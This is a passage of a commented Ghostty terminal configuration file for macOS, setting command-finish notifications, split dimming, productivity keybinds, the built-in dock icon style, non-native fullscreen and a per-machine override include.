# is in another app (it doesn't bug you if you're already looking at the terminal).
notify-on-command-finish = unfocused

# Only notifies if it took more than 10 seconds.
notify-on-command-finish-after = 10s

# Native macOS notification, without the bell sound.
notify-on-command-finish-action = no-bell,notify

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 3 — Visual polish
# ═══════════════════════════════════════════════════════════════

# Unfocused splits dim to 85% — you see instantly where you're typing.
unfocused-split-opacity = 0.85

# Shows the dimensions (cols×rows) when resizing the window.
resize-overlay = always
resize-overlay-position = center

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 4 — Productive keybinds
# ═══════════════════════════════════════════════════════════════

# Clears the screen (preserves the scrollback).
keybind = cmd+k=clear_screen

# Opens the config file with your default editor.
keybind = cmd+comma=open_config

# Reloads the config without restarting Ghostty.
keybind = cmd+shift+r=reload_config

# Copies the URL selected in the buffer to the clipboard.
keybind = cmd+shift+u=copy_url_to_clipboard

# Changes the current tab's title (useful for organizing SDD).
keybind = cmd+shift+i=prompt_surface_title

# Jump-to-prompt (requires shell-integration, already active above).
# Jumps to the previous/next prompt in the scrollback — key to
# re-read long Claude Code outputs without scrolling by hand.
keybind = cmd+up=jump_to_prompt:-1
keybind = cmd+down=jump_to_prompt:1

# Tabs by number: ⌘1..⌘9 jumps straight to that tab.
keybind = cmd+one=goto_tab:1
keybind = cmd+two=goto_tab:2
keybind = cmd+three=goto_tab:3
keybind = cmd+four=goto_tab:4
keybind = cmd+five=goto_tab:5
keybind = cmd+six=goto_tab:6
keybind = cmd+seven=goto_tab:7
keybind = cmd+eight=goto_tab:8
keybind = cmd+nine=goto_tab:9

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 5 — dock icon: the built-in `official` style
# ═══════════════════════════════════════════════════════════════

# `official` (2026-09-15) — Ghostty's own icon: a blue CRT gradient behind the
# glowing ghost and its `>_` prompt, in a dark chrome frame. It is the only style
# that carries the project's real colours, and the one the update dialog always
# shows regardless of this setting, so dock and updater stop disagreeing.
#
# Third icon of the day. `xray` (white ghost over a monochrome PCB) read too
# industrial next to a Tahoe dock; `glass` was the macOS 26 answer to that and
# went too far the other way — the material is so clear that the icon reads as an
# empty slot in the dock. Colour beats matching the OS material here.
#
# Still a stock style on purpose. The icon never followed `theme =` (Ghostty has no
# such binding), so a `custom-style` icon would be a second palette to keep in sync
# by hand for a 128px square you glance at. If the blue ever has to go, that is the
# escape hatch — e.g. the terminal's own canvas as the screen:
#   macos-icon = custom-style
#   macos-icon-frame = aluminum
#   macos-icon-ghost-color = #ffffff
#   macos-icon-screen-color = #031219,#001e27
#
# Other built-in styles: glass (translucent), blueprint, chalkboard, xray,
# holographic, paper, retro, microchip. Note microchip is the GREEN board with an
# orange trace and xray the monochrome one — the names are easy to swap and the
# only way to tell is to look (the PNGs live in Assets.car, `MicrochipImage` /
# `XrayImage`). And `custom-style`, the only one that takes colors — it then
# REQUIRES macos-icon-frame (aluminum|beige|plastic|chrome),
# macos-icon-ghost-color and macos-icon-screen-color (a linear vertical
# gradient, first color = bottom). `macos-custom-icon` takes a PNG/ICNS path.
# Enumerated from `ghostty +show-config --default --docs` on 1.3.1.
macos-icon = official

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 6 — Fullscreen pro (macOS)
# ═══════════════════════════════════════════════════════════════

# Non-native fullscreen: without the macOS animated transition
# (it doesn't send Ghostty to another "space"), keeps the menubar visible.
# Much better for quick focus mode with ⌘↩.
# Other options: false (native), true (non-native without menubar).
macos-non-native-fullscreen = visible-menu

# If you prefer to hide the traffic lights (red/yellow/green) when
# you enter fullscreen for a cleaner view, uncomment:
# macos-window-buttons = hidden

# ─── per-machine ──────────────────────────────────────────────
# Unversioned overrides for this machine (font-size lives there). Ghostty loads
# an included file after this one wherever the line sits, so its values win; the
# `?` makes a missing file a no-op rather than an error.
config-file = ?~/.config/ghostty/config.local

